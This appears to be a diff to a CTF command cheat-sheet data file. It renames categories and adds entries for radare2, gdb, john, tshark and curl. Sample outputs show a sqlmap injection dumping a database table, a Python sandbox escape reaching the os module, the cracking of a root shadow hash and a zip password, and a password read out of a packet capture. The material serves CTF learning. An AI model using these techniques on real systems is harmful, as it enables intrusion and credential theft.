@@ -363,7 +363,7 @@
       "\u003e\u003e\u003e ''.__class__.mro()[2].__subclasses__()[59]\n\u003cclass 'warnings.catch_warnings'\u003e\n\u003e\u003e\u003e ''.__class__.mro()[2].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['os']\n\u003cmodule 'os' from '/usr/local/lib/python2.7/os.pyc'\u003e"
     ],
     [
-      "Web",
+      "Network and Web",
       "Fetch",
       "0",
       "No",
@@ -443,7 +443,7 @@
       "sqlmap -u https://ad521d5b99e850729b9d3694ceb69bba.lupus.avatao-challenge.com/?order=id --dump -D test -T secrets\n        ___\n       __H__\n ___ ___[)]_____ ___ ___  {1.2.5#stable}\n|_ -| . [,]     | .'| . |\n|___|_  [)]_|_|_|__,|  _|\n      |_|V          |_|   http://sqlmap.org\n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n\n[*] starting at 13:45:11\n\n[13:45:11] [INFO] resuming back-end DBMS 'mysql' \n[13:45:12] [INFO] testing connection to the target URL\nsqlmap resumed the following injection point(s) from stored session:\n---\nParameter: order (GET)\n    Type: boolean-based blind\n    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause\n    Payload: order=id RLIKE (SELECT (CASE WHEN (7213=7213) THEN 0x6964 ELSE 0x28 END))\n\n    Type: AND/OR time-based blind\n    Title: MySQL \u003e= 5.0.12 AND time-based blind\n    Payload: order=id AND SLEEP(5)\n---\n[13:45:12] [INFO] the back-end DBMS is MySQL\nweb server operating system: Linux Ubuntu\nweb application technology: Nginx, PHP 5.5.9\nback-end DBMS: MySQL \u003e= 5.0.12\n[13:45:12] [INFO] fetching columns for table 'secrets' in database 'test'\n[13:45:12] [INFO] resumed: 1\n[13:45:12] [INFO] resumed: secret\n[13:45:12] [INFO] fetching entries for table 'secrets' in database 'test'\n[13:45:12] [INFO] fetching number of entries for table 'secrets' in database 'test'\n[13:45:12] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval\n[13:45:12] [INFO] retrieved: 1\n[13:45:14] [INFO] retrieved: OUR_APPLE_IS_NOT_AS_YUMMY_AS_ADVERTITED\nDatabase: test\nTable: secrets\n[1 entry]\n+-----------------------------------------+\n| secret                                  |\n+-----------------------------------------+\n| OUR_APPLE_IS_NOT_AS_YUMMY_AS_ADVERTITED |\n+-----------------------------------------+\n\n[13:46:46] [INFO] table 'test.secrets' dumped to CSV file '/root/.sqlmap/output/ad521d5b99e850729b9d3694ceb69bba.lupus.avatao-challenge.com/dump/test/secrets.csv'\n[13:46:46] [INFO] fetched data logged to text files under '/root/.sqlmap/output/ad521d5b99e850729b9d3694ceb69bba.lupus.avatao-challenge.com'\n\n[*] shutting down at 13:46:46"
     ],
     [
-      "Network",
+      "Network and Web",
       "Wireshark",
       "0",
       "No",
@@ -452,7 +452,7 @@
       "https://www.wireshark.org/docs/wsug_html_chunked/ChWorkBuildDisplayFilterSection.html"
     ],
     [
-      "Network",
+      "Network and Web",
       "Wireshark",
       "0",
       "No",
@@ -461,7 +461,7 @@
       "https://securabit.com/2013/04/06/wireshark-export-http-objects/"
     ],
     [
-      "Network",
+      "Network and Web",
       "tshark",
       "0",
       "No",
@@ -481,7 +481,7 @@
       "$ checksec.sh -f believeMe\nRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH\tSymbols\t\tFORTIFY\tFortified\tFortifiable  FILE\nPartial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   82 Symbols\tYes\t0\t\t4\tbelieveMe"
     ],
     [
-      "Web",
+      "Network and Web",
       "Path Scanners",
       "0",
       "No",
@@ -699,12 +699,12 @@
     [
       "Passwords",
       "john",
-      "20",
+      "30",
       "No",
       "john \u003cpassword_file\u003e",
       "Attempt to crack password.",
       "https://manpages.debian.org/jessie/john/john.8.en.html",
-      "$ unshadow passwd shadow \u003e mypass.txt\n$ cat mypass.txt \nroot:$6$IGI9prWh$ZHToiAnzeD1Swp.zQzJ/Gv.iViy39EmjVsg3nsZlfejvrAjhmp5jY.1N6aRbjFJVQX8hHmTh7Oly3NzogaH8c1:0:0:root:/root:/bin/bash\n$ john mypass.txt \nWarning: detected hash type \"sha512crypt\", but the string is also recognized as \"crypt\"\nUse the \"--format=crypt\" option to force loading these as that type instead\nUsing default input encoding: UTF-8\nLoaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])\nPress 'q' or Ctrl-C to abort, almost any other key for status\npassword1        (root)\n1g 0:00:00:01 DONE 2/3 (2018-10-08 23:22) 0.6666g/s 587.4p/s 587.4c/s 587.4C/s 123456..green\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed"
+      "$ unshadow passwd shadow \u003e mypass.txt\n$ cat mypass.txt \nroot:$6$IGI9prWh$ZHToiAnzeD1Swp.zQzJ/Gv.iViy39EmjVsg3nsZlfejvrAjhmp5jY.1N6aRbjFJVQX8hHmTh7Oly3NzogaH8c1:0:0:root:/root:/bin/bash\n$ john mypass.txt \nWarning: detected hash type \"sha512crypt\", but the string is also recognized as \"crypt\"\nUse the \"--format=crypt\" option to force loading these as that type instead\nUsing default input encoding: UTF-8\nLoaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])\nPress 'q' or Ctrl-C to abort, almost any other key for status\npassword1        (root)\n1g 0:00:00:01 DONE 2/3 (2018-10-08 23:22) 0.6666g/s 587.4p/s 587.4c/s 587.4C/s 123456..green\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed\n\n$ ~/utils/john/run/zip2john output/65 \u003e zip.hashes\nver 1.0 efh 5455 efh 7875 65/password.txt PKZIP Encr: 2b chk, TS_chk, cmplen=44, decmplen=32, crc=4341BA5D\n$ cat zip.hashes\n65/password.txt:$pkzip2$1*2*2*0*2c*20*4341ba5d*0*46*0*2c*4341*6eab*327fdc864aefd7fd5a7462f9355e15e84fc09d4e7d3a5ecd1318f77f7f6f2c86b62edc0a6d7eb87cba92a613*$/pkzip2$:password.txt:65::output/65\n$ ~/utils/john/run/john zip.hashes\nUsing default input encoding: UTF-8\nLoaded 1 password hash (PKZIP [32/64])\nWarning: OpenMP is disabled; a non-OpenMP build may be faster\nPress 'q' or Ctrl-C to abort, almost any other key for status\nasdf             (65/password.txt)\n1g 0:00:00:00 DONE 2/3 (2018-11-26 22:27) 7.692g/s 101915p/s 101915c/s 101915C/s lacrosse..franklin\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed"
     ],
     [
       "Forensics",
@@ -744,7 +744,7 @@
       "binwalk --dd=\".*\" \u003cfile_name\u003e",
       "Extract any file type using Binwalk (not just known types).",
       "https://github.com/ReFirmLabs/binwalk/wiki/Usage",
-      "# binwalk --dd=\".*\" animals.bin\n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n39424         0x9A00          JPEG image data, JFIF standard 1.01\n39454         0x9A1E          TIFF image data, big-endian, offset of first image directory: 8\n672256        0xA4200         JPEG image data, JFIF standard 1.01\n1165824       0x11CA00        JPEG image data, JFIF standard 1.01\n1556992       0x17C200        JPEG image data, JFIF standard 1.01\n1812992       0x1BAA00        JPEG image data, JFIF standard 1.01\n1813022       0x1BAA1E        TIFF image data, big-endian, offset of first image directory: 8\n2136576       0x209A00        JPEG image data, JFIF standard 1.01\n2136606       0x209A1E        TIFF image data, big-endian, offset of first image directory: 8\n2607616       0x27CA00        JPEG image data, JFIF standard 1.01\n2607646       0x27CA1E        TIFF image data, big-endian, offset of first image directory: 8\n3000832       0x2DCA00        JPEG image data, JFIF standard 1.01\n3000862       0x2DCA1E        TIFF image data, big-endian, offset of first image directory: 8"
+      "root@kali:/media/sf_CTFs/tamu/I_heard_you_like_files# binwalk --dd=\".*\" art.png\n\nDECIMAL       HEXADECIMAL     DESCRIPTION\n--------------------------------------------------------------------------------\n0             0x0             PNG image, 1920 x 1080, 8-bit/color RGBA, non-interlaced\n3408641       0x340301        PDF document, version: \"1.5\"\n3408712       0x340348        Zlib compressed data, default compression\n3412206       0x3410EE        Zlib compressed data, default compression\n3419203       0x342C43        Zlib compressed data, default compression\n3419994       0x342F5A        Zlib compressed data, default compression\n3428883       0x345213        Zlib compressed data, default compression\n3430685       0x34591D        Zip archive data, at least v2.0 to extract, compressed size: 217, uncompressed size: 573, name: _rels/.rels\n3430943       0x345A1F        Zip archive data, at least v2.0 to extract, compressed size: 288, uncompressed size: 511, name: docProps/app.xml\n3431277       0x345B6D        Zip archive data, at least v2.0 to extract, compressed size: 356, uncompressed size: 731, name: docProps/core.xml\n3431680       0x345D00        Zip archive data, at least v2.0 to extract, compressed size: 222, uncompressed size: 663, name: word/_rels/document.xml.rels\n3431960       0x345E18        Zip archive data, at least v2.0 to extract, compressed size: 165, uncompressed size: 208, name: word/settings.xml\n3432172       0x345EEC        Zip archive data, at least v2.0 to extract, compressed size: 297, uncompressed size: 918, name: word/fontTable.xml\n3432517       0x346045        Zip archive data, at least v2.0 to extract, compressed size: 83172, uncompressed size: 84725, name: word/media/image1.png\n3515768       0x35A578        Zip archive data, at least v2.0 to extract, compressed size: 1138, uncompressed size: 4099, name: word/document.xml\n3516953       0x35AA19        Zip archive data, at least v2.0 to extract, compressed size: 605, uncompressed size: 2192, name: word/styles.xml\n3517603       0x35ACA3        Zip archive data, at least v2.0 to extract, compressed size: 352, uncompressed size: 1443, name: [Content_Types].xml\n3518004       0x35AE34        Zip archive data, at least v1.0 to extract, compressed size: 20, uncompressed size: 20, name: not_the_flag.txt\n3518847       0x35B17F        End of Zip archive, footer length: 22\n\nroot@kali:/media/sf_CTFs/tamu/I_heard_you_like_files# cd _art.png.extracted/\nroot@kali:/media/sf_CTFs/tamu/I_heard_you_like_files/_art.png.extracted# file *\n0:           PNG image data, 1920 x 1080, 8-bit/color RGBA, non-interlaced\n340301:      PDF document, version 1.5\n340348:      ASCII text, with very long lines\n340348.zlib: Zip archive data, \n3410EE:      TrueType Font data, 12 tables, 1st \"cmap\", 15 names, Microsoft, language 0x409, Copyright 2015 Google Inc. All Rights Reserved.Noto SansRegular2.000;GOOG;NotoSans-RegularNoto\n3410EE.zlib: Zip archive data\n342C43:      ASCII text\n342C43.zlib: Zip archive data\n342F5A:      TrueType Font data, 12 tables, 1st \"cmap\", 26 names, Macintosh, Copyright (c) 2003 by Bitstream, Inc. All Rights Reserved.\n342F5A.zlib: Zip archive data, `r1!`\n345213:      ASCII text\n345213.zlib: Zip archive data\n34591D:      Microsoft Word 2007+\n35B17F:      Zip archive data (empty)"
     ],
     [
       "Forensics",
@@ -840,7 +840,7 @@
       "No",
       "{ echo \"name\"; echo 'a_reAllY_s3cuRe_p4s$word_56b977';} | cat",
       "Echo two lines by including them in curly brackets. No need to escape the dollar sign since string is enclosed within single quotes.\nOutput piped to cat.",
-      "",
+      "https://www.gnu.org/software/bash/manual/bashref.html#Command-Grouping",
       "# { echo \"name\"; echo 'a_reAllY_s3cuRe_p4s$word_56b977';} | cat\nname\na_reAllY_s3cuRe_p4s$word_56b977\n# { echo \"name\"; echo \"a_reAllY_s3cuRe_p4s$word_56b977\";} | cat\nname\na_reAllY_s3cuRe_p4s"
     ],
     [
@@ -882,7 +882,7 @@
       "# dd skip=$((0x858)) count=25 if=main of=out.bin bs=1\n25+0 records in\n25+0 records out\n25 bytes copied, 0.00880228 s, 2.8 kB/s\n# xxd out.bin \n00000000: 2906 164f 2b35 301e 511b 5b14 4b08 5d2b  )..O+50.Q.[.K.]+\n00000010: 5c10 0606 1845 5100 5d                   \\....EQ.]\n"
     ],
     [
-      "Network",
+      "Network and Web",
       "Transfer Files",
       "10",
       "No",
@@ -891,7 +891,7 @@
       "https://haydenjames.io/linux-securely-copy-files-using-scp/"
     ],
     [
-      "Network",
+      "Network and Web",
       "Transfer Files",
       "20",
       "No",
@@ -914,7 +914,7 @@
       "sqlmap",
       "60",
       "No",
-      "sqlmap.py -u \u003curl\u003e --method POST --data \u003cdate\u003e -p \u003cfield_to_attack\u003e",
+      "sqlmap.py -u \u003curl\u003e --method POST --data \u003cdata\u003e -p \u003cfield_to_attack\u003e",
       "Automate the process of detecting and exploiting SQL injection flaws using a POST form.",
       "http://sqlmap.org/\nhttp://carnal0wnage.attackresearch.com/2011/03/sqlmap-with-post-requests.html",
       "sqlmap.py -u \"http://www.example.com/login.php\" --method POST --data \"username=1&password=1\" -p \"username\""
@@ -1088,7 +1088,7 @@
       "root@kali:/media/sf_CTFs/pico/Ext_Super_Magic/v2# xxd -s $((1024+56)) -l 16 ext-super-magic.img\n00000438: 0000 0100 0100 0000 74dc ad5b 0000 0000  ........t..[....\nroot@kali:/media/sf_CTFs/pico/Ext_Super_Magic/v2# cp ext-super-magic.img ext-super-magic.old\nroot@kali:/media/sf_CTFs/pico/Ext_Super_Magic/v2# printf '\\x53\\xef' | dd conv=notrunc of=ext-super-magic.img bs=1 seek=$((1024+56))\n2+0 records in\n2+0 records out\n2 bytes copied, 0.00398822 s, 0.5 kB/s\nroot@kali:/media/sf_CTFs/pico/Ext_Super_Magic/v2# xxd -s $((1024+56)) -l 16 ext-super-magic.img\n00000438: 53ef 0100 0100 0000 74dc ad5b 0000 0000  S.......t..[...."
     ],
     [
-      "Network",
+      "Network and Web",
       "tshark",
       "10",
       "No",
@@ -1096,6 +1096,434 @@
       "Display all frames from a network capture which comply with filter.\n\nAdd '-x' for a full hex dump of the packets.\n\nAlternatively, use '-T json' to display readable JSON format.",
       "",
       "root@kali:/media/sf_CTFs/pico/admin_panel# tshark -nr data.pcap -Y 'frame contains \"password\"'\nRunning as user \"root\" and group \"root\". This could be dangerous.\ntshark: Lua: Error during loading:\n [string \"/usr/share/wireshark/init.lua\"]:32: dofile has been disabled due to running Wireshark as superuser. See https://wiki.wireshark.org/CaptureSetup/CapturePrivileges for help in running Wireshark as an unprivileged user.\n    8   0.004782 192.168.3.128 → 192.168.3.129 HTTP 2354 HTTP/1.0 200 OK  (text/html) 80 37556\n   17  12.370383 192.168.3.129 → 192.168.3.128 HTTP 522 POST /login HTTP/1.1  (application/x-www-form-urlencoded) 37894 80\n   21  12.373739 192.168.3.128 → 192.168.3.129 HTTP 569 HTTP/1.0 302 FOUND  (text/html) 80 37894\n   27  12.434002 192.168.3.129 → 192.168.3.128 HTTP 480 GET /admin HTTP/1.1  37896 80\n   43  14.662211 192.168.3.129 → 192.168.3.128 HTTP 486 GET /logout HTTP/1.1  37946 80\n   47  14.665356 192.168.3.128 → 192.168.3.129 HTTP 653 HTTP/1.0 302 FOUND  (text/html) 80 37946\n   60  14.675592 192.168.3.128 → 192.168.3.129 HTTP 906 HTTP/1.0 200 OK  (text/html) 80 37948\n   68  37.234879 192.168.3.129 → 192.168.3.128 HTTP 542 POST /login HTTP/1.1  (application/x-www-form-urlencoded)[Packet size limited during capture] 38526 80\n\nroot@kali:/media/sf_CTFs/pico/admin_panel# tshark -nr data.pcap -Y 'frame.number==68' -x\nRunning as user \"root\" and group \"root\". This could be dangerous.\ntshark: Lua: Error during loading:\n [string \"/usr/share/wireshark/init.lua\"]:32: dofile has been disabled due to running Wireshark as superuser. See https://wiki.wireshark.org/CaptureSetup/CapturePrivileges for help in running Wireshark as an unprivileged user.\n0000  00 0c 29 1c df f2 00 0c 29 79 dc c4 08 00 45 00   ..).....)y....E.\n0010  02 10 f6 7c 40 00 40 06 ba 19 c0 a8 03 81 c0 a8   ...|@.@.........\n0020  03 80 96 7e 00 50 12 95 30 5d 2e 5b be 02 80 18   ...~.P..0].[....\n0030  00 e5 8a 54 00 00 01 01 08 0a 18 8c 0c 8d f0 d7   ...T............\n0040  91 77 50 4f 53 54 20 2f 6c 6f 67 69 6e 20 48 54   .wPOST /login HT\n0050  54 50 2f 31 2e 31 0d 0a 48 6f 73 74 3a 20 31 39   TP/1.1..Host: 19\n0060  32 2e 31 36 38 2e 33 2e 31 32 38 0d 0a 55 73 65   2.168.3.128..Use\n0070  72 2d 41 67 65 6e 74 3a 20 4d 6f 7a 69 6c 6c 61   r-Agent: Mozilla\n0080  2f 35 2e 30 20 28 58 31 31 3b 20 55 62 75 6e 74   /5.0 (X11; Ubunt\n0090  75 3b 20 4c 69 6e 75 78 20 78 38 36 5f 36 34 3b   u; Linux x86_64;\n00a0  20 72 76 3a 35 39 2e 30 29 20 47 65 63 6b 6f 2f    rv:59.0) Gecko/\n00b0  32 30 31 30 30 31 30 31 20 46 69 72 65 66 6f 78   20100101 Firefox\n00c0  2f 35 39 2e 30 0d 0a 41 63 63 65 70 74 3a 20 74   /59.0..Accept: t\n00d0  65 78 74 2f 68 74 6d 6c 2c 61 70 70 6c 69 63 61   ext/html,applica\n00e0  74 69 6f 6e 2f 78 68 74 6d 6c 2b 78 6d 6c 2c 61   tion/xhtml+xml,a\n00f0  70 70 6c 69 63 61 74 69 6f 6e 2f 78 6d 6c 3b 71   pplication/xml;q\n0100  3d 30 2e 39 2c 2a 2f 2a 3b 71 3d 30 2e 38 0d 0a   =0.9,*/*;q=0.8..\n0110  41 63 63 65 70 74 2d 4c 61 6e 67 75 61 67 65 3a   Accept-Language:\n0120  20 65 6e 2d 55 53 2c 65 6e 3b 71 3d 30 2e 35 0d    en-US,en;q=0.5.\n0130  0a 41 63 63 65 70 74 2d 45 6e 63 6f 64 69 6e 67   .Accept-Encoding\n0140  3a 20 67 7a 69 70 2c 20 64 65 66 6c 61 74 65 0d   : gzip, deflate.\n0150  0a 52 65 66 65 72 65 72 3a 20 68 74 74 70 3a 2f   .Referer: http:/\n0160  2f 31 39 32 2e 31 36 38 2e 33 2e 31 32 38 2f 0d   /192.168.3.128/.\n0170  0a 43 6f 6e 74 65 6e 74 2d 54 79 70 65 3a 20 61   .Content-Type: a\n0180  70 70 6c 69 63 61 74 69 6f 6e 2f 78 2d 77 77 77   pplication/x-www\n0190  2d 66 6f 72 6d 2d 75 72 6c 65 6e 63 6f 64 65 64   -form-urlencoded\n01a0  0d 0a 43 6f 6e 74 65 6e 74 2d 4c 65 6e 67 74 68   ..Content-Length\n01b0  3a 20 35 33 0d 0a 43 6f 6e 6e 65 63 74 69 6f 6e   : 53..Connection\n01c0  3a 20 6b 65 65 70 2d 61 6c 69 76 65 0d 0a 55 70   : keep-alive..Up\n01d0  67 72 61 64 65 2d 49 6e 73 65 63 75 72 65 2d 52   grade-Insecure-R\n01e0  65 71 75 65 73 74 73 3a 20 31 0d 0a 0d 0a 75 73   equests: 1....us\n01f0  65 72 3d 61 64 6d 69 6e 26 70 61 73 73 77 6f 72   er=admin&passwor\n0200  64 3d 70 69 63 6f 43 54 46 7b 6e 30 74 73 33 63   d=picoCTF{n0ts3c\n0210  75 72 33 5f 39 66 65 65 64 66 62 63 7d            ur3_9feedfbc}"
+    ],
+    [
+      "Executables",
+      "Radare2",
+      "150",
+      "No",
+      "pcp \u003clength\u003e @ \u003caddress\u003e",
+      "Print buffer in python-compatible mode.",
+      "https://radare.gitbooks.io/radare2book/basic_commands/print_modes.html",
+      ":\u003e pcp 0x23 @ obj.FLAG\nimport struct\nbuf = struct.pack (\"35B\", *[\n0x84,0x93,0x81,0xbc,0x93,0xb0,0xa8,0x98,0x97,0xa6,0xb4,\n0x94,0xb0,0xa8,0xb5,0x83,0xbd,0x98,0x85,0xa2,0xb3,0xb3,\n0xa2,0xb5,0x98,0xb3,0xaf,0xf3,0xa9,0x98,0xf6,0x98,0xac,\n0xf8,0xba])"
+    ],
+    [
+      "Passwords",
+      "john",
+      "20",
+      "No",
+      "zip2john \u003czip_file\u003e \u003e \u003cpassword_file\u003e",
+      "Encode a zip file's password in a format John can crack.",
+      "https://dfir.science/2014/07/how-to-cracking-zip-and-rar-protected.html",
+      "# ~/utils/john/run/zip2john output/65 \u003e zip.hashes\nver 1.0 efh 5455 efh 7875 65/password.txt PKZIP Encr: 2b chk, TS_chk, cmplen=44, decmplen=32, crc=4341BA5D\nroot@kali:/media/sf_CTFs/google/obscurety/new# cat zip.hashes\n65/password.txt:$pkzip2$1*2*2*0*2c*20*4341ba5d*0*46*0*2c*4341*6eab*327fdc864aefd7fd5a7462f9355e15e84fc09d4e7d3a5ecd1318f77f7f6f2c86b62edc0a6d7eb87cba92a613*$/pkzip2$:password.txt:65::output/65"
+    ],
+    [
+      "Passwords",
+      "john",
+      "40",
+      "No",
+      "john \u003cpassword_file\u003e --show",
+      "Display a password after cracking it.",
+      "https://manpages.debian.org/jessie/john/john.8.en.html",
+      "root@kali:/media/sf_CTFs/google/obscurety/new# ~/utils/john/run/john zip.hashes --show\n65/password.txt:asdf:password.txt:65::output/65\n\n1 password hash cracked, 0 left"
+    ],
+    [
+      "Forensics",
+      "File Systems",
+      "30",
+      "No",
+      "mount \u003cfile_system\u003e \u003cmount_path\u003e",
+      "Mount file system to local mount path.\n\nNote: Problematic if file system image is located on NTFS share.",
+      "http://man7.org/linux/man-pages/man8/mount.8.html",
+      "root@kali:~/CTFs/google# mkdir /media/m\nroot@kali:~/CTFs/google# mount challenge.ext4 /media/m"
+    ],
+    [
+      "GDB",
+      "Commands",
+      "190",
+      "No",
+      "info address \u003caddress\u003e",
+      "Show info about a specific address.",
+      "https://sourceware.org/gdb/onlinedocs/gdb/Symbols.html#Symbols",
+      "gdb-peda$ info address system@plt\nSymbol \"system@plt\" is at 0x555555554940 in a file compiled without debugging.\ngdb-peda$ disas 0x555555554940\nDump of assembler code for function system@plt:\n   0x0000555555554940 \u003c+0\u003e:     jmp    QWORD PTR [rip+0x2026f2]        # 0x555555757038\n   0x0000555555554946 \u003c+6\u003e:     push   0x4\n   0x000055555555494b \u003c+11\u003e:    jmp    0x5555555548f0\nEnd of assembler dump."
+    ],
+    [
+      "GDB",
+      "Commands",
+      "200",
+      "No",
+      "readelf",
+      "Show info about ELF file.",
+      "https://linux.die.net/man/1/readelf",
+      "gdb-peda$ readelf\n.interp = 0x555555554238\n.note.ABI-tag = 0x555555554254\n.note.gnu.build-id = 0x555555554274\n.gnu.hash = 0x555555554298\n.dynsym = 0x5555555542c0\n.dynstr = 0x555555554500\n.gnu.version = 0x555555554600\n.gnu.version_r = 0x555555554630\n.rela.dyn = 0x555555554660\n.rela.plt = 0x555555554750\n.init = 0x5555555548d0\n.plt = 0x5555555548f0\n.plt.got = 0x555555554a00\n.text = 0x555555554a10\n.fini = 0x5555555552d4\n.rodata = 0x5555555552e0\n.eh_frame_hdr = 0x5555555567b8\n.eh_frame = 0x555555556878\n.init_array = 0x555555756de8\n.fini_array = 0x555555756df0\n.dynamic = 0x555555756df8\n.got = 0x555555756fd8\n.got.plt = 0x555555757000\n.data = 0x555555757098\n.bss = 0x5555557570c0"
+    ],
+    [
+      "Network and Web",
+      "tshark",
+      "0",
+      "No",
+      "tshark -r \u003cpcap\u003e -Y \"data.len != 0\" -T json -e tcp.stream -e data.data",
+      "Receive JSON-encoded structure of all TCP packets which contain data.",
+      "",
+      "tshark -r $pcap -Y \"data.len != 0\" -T json -e tcp.stream -e data.data\n...\n  {\n    \"_index\": \"packets-2019-01-06\",\n    \"_type\": \"pcap_file\",\n    \"_score\": null,\n    \"_source\": {\n      \"layers\": {\n        \"tcp.stream\": [\"0\"],\n        \"data.data\": [\"35:37:30:32:38:39:30:38:31:34:36:38:35:36:30:30:36:31:37:31:32:34:35:30:32:32:38:38:33:30:38:35:31:31:31:33:37:31:39:32:0a\"]\n      }\n    }\n  }\n\n  ,\n  {\n    \"_index\": \"packets-2019-01-06\",\n    \"_type\": \"pcap_file\",\n    \"_score\": null,\n    \"_source\": {\n      \"layers\": {\n        \"tcp.stream\": [\"0\"],\n        \"data.data\": [\"41:43:43:45:53:53:20:47:52:41:4e:54:45:44:0a:39:32:33:66:61:31:38:33:35:64:38:64:62:64:63:64:39:66:39:62:30:65:36:36:35:38:62:32:34:66:63:65:35:34:35:31:32:66:62:62:61:37:31:64:37:61:30:30:31:32:63:33:37:64:32:63:39:64:64:30:39:34:61:36:32:37:38:35:39:33:64:38:64:39:66:37:61:34:61:61:39:66:65:63:62:36:36:30:34:32:0a\"]\n      }\n    }\n  }\n..."
+    ],
+    [
+      "Executables",
+      "Radare2",
+      "160",
+      "No",
+      "f",
+      "List all the flags from the selected flagspace.\n\nThe \"f\" command is used to list all the flags from the selected flagspace. By default all the available flagspaces are selected. In order to select the 'symbols' flagspace and list only the flags inside it, prepend the \"fs symbols\" command.",
+      "https://reverseengineering.stackexchange.com/questions/15643/how-to-find-a-symbol-in-a-binary-using-radare2\nhttps://radare.gitbooks.io/radare2book/content/basic_commands/flags.html",
+      "[0x004049a0]\u003e fs symbols\n[0x004049a0]\u003e f\n0x00402a00 261 main\n0x004049a0 41 entry0\n0x0061e600 8 obj.__bss_start\n0x00413c8c 9 sym._fini\n0x0061e610 4 obj.optind\n0x004022b8 26 sym._init\n0x0061e620 8 obj.program_invocation_name\n0x0061e600 0 loc.__bss_start\n0x0061f368 0 loc._end\n0x00412960 38 sym._obstack_memory_used\n0x0061e5f8 8 obj.obstack_alloc_failed_handler\n0x00412780 17 sym._obstack_begin\n0x0061e640 8 obj.stderr\n0x004128f0 106 sym._obstack_free\n0x004128c0 48 sym._obstack_allocated_p\n0x0061e618 8 obj.optarg\n0x004127a0 21 sym._obstack_begin_1\n0x004127c0 245 sym._obstack_newchunk\n0x0061e608 8 obj.stdout"
+    ],
+    [
+      "Executables",
+      "Radare2",
+      "170",
+      "No",
+      "is",
+      "Retrieve symbol information.\n\nIt is also possible to grep results with \"~\".",
+      "https://reverseengineering.stackexchange.com/questions/15643/how-to-find-a-symbol-in-a-binary-using-radare2",
+      "[0x004049a0]\u003e is~strcpy\nvaddr=0x004023c0 paddr=0x000023c0 ord=013 fwd=NONE sz=16 bind=GLOBAL type=FUNC name=imp.strcpy"
+    ],
+    [
+      "Network and Web",
+      "Fetch",
+      "10",
+      "No",
+      "curl --cookie \"\u003ccookie_name\u003e=\u003ccookie_value\u003e\" \u003curi\u003e",
+      "Fetch documents/files from servers, send a cookie as input.",
+      "https://curl.haxx.se/docs/manpage.html",
+      "# curl -v --cookie \"seller_cookie=RGFydGh4TmFobWFu\" http://darthvaderfans.noxale.com/\n*   Trying 18.220.135.102...\n* TCP_NODELAY set\n* Connected to darthvaderfans.noxale.com (18.220.135.102) port 80 (#0)\n\u003e GET / HTTP/1.1\n\u003e Host: darthvaderfans.noxale.com\n\u003e User-Agent: curl/7.61.0\n\u003e Accept: */*\n\u003e Cookie: seller_cookie=RGFydGh4TmFobWFu\n\u003e\n\u003c HTTP/1.1 200 OK\n\u003c Host: darthvaderfans.noxale.com\n\u003c Connection: close\n\u003c X-Powered-By: PHP/7.0.32-0ubuntu0.16.04.1\n\u003c Set-Cookie: PHPSESSID=1d692c34d75fc6d5a28f003d837a43ee; path=/\n\u003c Expires: Thu, 19 Nov 1981 08:52:00 GMT\n\u003c Cache-Control: no-store, no-cache, must-revalidate\n\u003c Pragma: no-cache\n\u003c Content-type: text/html; charset=UTF-8\n\u003c\n\n\u003chtml\u003e\n\u003chead\u003e\n        \u003ctitle\u003eDarth Vader Fans!\u003c/title\u003e\n\u003c/head\u003e\n\u003cbody\u003e\n                \u003cimg src=\"img/logo.png\" class=\"logo\"/\u003e\n\u003c/body\u003e\n* Closing connection 0\n\u003c/html\u003e"
+    ],
+    [
+      "Network and Web",
+      "tshark",
+      "0",
+      "No",
+      "tshark -r \u003cfile.pcap\u003e",
+      "View PCAP file.",
+      "https://www.wireshark.org/docs/man-pages/tshark.html",
+      "# tshark -r KnockKnockKnock.pcap\n    1   0.000000    10.0.0.10 → 3.16.9.89    TCP 54 20 → 2510 [SYN] Seq=0 Win=8192 Len=0 20 2510\n    2   0.502349    10.0.0.10 → 3.16.9.89    TCP 54 20 → 2031 [SYN] Seq=0 Win=8192 Len=0 20 2031\n    3   1.017833    10.0.0.10 → 3.16.9.89    TCP 54 20 → 2000 [SYN] Seq=0 Win=8192 Len=0 20 2000\n    4   1.515503    10.0.0.10 → 3.16.9.89    TCP 66 2562 → 8200 [SYN] Seq=0 Win=8192 Len=0 MSS=1460 WS=256 SACK_PERM=1 2562 8200\n    5   1.691303    3.16.9.89 → 10.0.0.10    TCP 66 8200 → 2562 [RST] Seq=1 Win=26883 Len=0 MSS=1360 SACK_PERM=1 WS=128 8200 2562\n    6   1.694659    10.0.0.10 → 3.16.9.89    TCP 54 20 → 1111 [SYN] Seq=0 Win=8192 Len=0 20 1111\n    7   2.205073    10.0.0.10 → 3.16.9.89    TCP 54 20 → 2222 [SYN] Seq=0 Win=8192 Len=0 20 2222\n    8   2.705261    10.0.0.10 → 3.16.9.89    TCP 54 20 → 3333 [SYN] Seq=0 Win=8192 Len=0 20 3333\n    9   3.218129    10.0.0.10 → 3.16.9.89    TCP 66 2563 → 8200 [SYN] Seq=0 Win=8192 Len=0 MSS=1460 WS=256 SACK_PERM=1 2563 8200\n   10   3.432105    3.16.9.89 → 10.0.0.10    TCP 66 8200 → 2563 [RST] Seq=1 Win=26883 Len=0 MSS=1360 SACK_PERM=1 WS=128 8200 2563\n   11   3.435321    10.0.0.10 → 3.16.9.89    TCP 54 20 → 1122 [SYN] Seq=0 Win=8192 Len=0 20 1122\n   12   3.940159    10.0.0.10 → 3.16.9.89    TCP 54 20 → 3344 [SYN] Seq=0 Win=8192 Len=0 20 3344\n   13   4.455189    10.0.0.10 → 3.16.9.89    TCP 54 20 → 5566 [SYN] Seq=0 Win=8192 Len=0 20 5566\n   14   4.968132    10.0.0.10 → 3.16.9.89    TCP 66 2564 → 8200 [SYN] Seq=0 Win=8192 Len=0 MSS=1460 WS=256 SACK_PERM=1 2564 8200\n   15   5.172456    3.16.9.89 → 10.0.0.10    TCP 66 8200 